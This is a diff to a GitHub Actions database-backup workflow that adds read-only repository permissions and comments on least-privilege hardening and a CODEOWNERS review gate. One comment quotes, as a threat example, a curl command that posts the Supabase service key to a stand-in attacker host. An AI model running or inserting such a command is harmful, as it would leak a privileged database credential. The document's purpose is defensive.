@@ -43,11 +43,34 @@ concurrency:
   group: db-backup
   cancel-in-progress: false
 
+# -----------------------------------------------------------------------------
+# Wave 2 INFRA-08 hardening — explicit least-privilege permissions.
+#
+# Default to read-only on contents. The job does NOT need write access to the
+# repo: it dumps the DB, uploads to S3-compatible storage, and POSTs one row
+# to public.backup_audit_log via PostgREST.
+#
+# Currently uses SUPABASE_SERVICE_KEY for that POST (full bypass-RLS).
+# Wave 3 follow-up: switch to a JWT signed for the least-privilege role
+# `backup_audit_writer` (see supabase/migrations/20260529110000_*.sql).
+#
+# Workflow-modify gate: .github/CODEOWNERS requires @advocatestonia review
+# on any change to this file or scripts/db_dump.sh — prevents a contributor
+# from quietly adding `curl evil.example -d "$SUPABASE_SERVICE_KEY"`.
+# -----------------------------------------------------------------------------
+permissions:
+  contents: read
+
 jobs:
   dump:
     name: pg_dump + upload
     runs-on: ubuntu-latest
     timeout-minutes: 30
+    # Job-level permissions inherit from workflow above (contents: read).
+    # Documented again here so a future split into matrix jobs preserves
+    # the least-privilege posture.
+    permissions:
+      contents: read
 
     steps:
       - name: Checkout
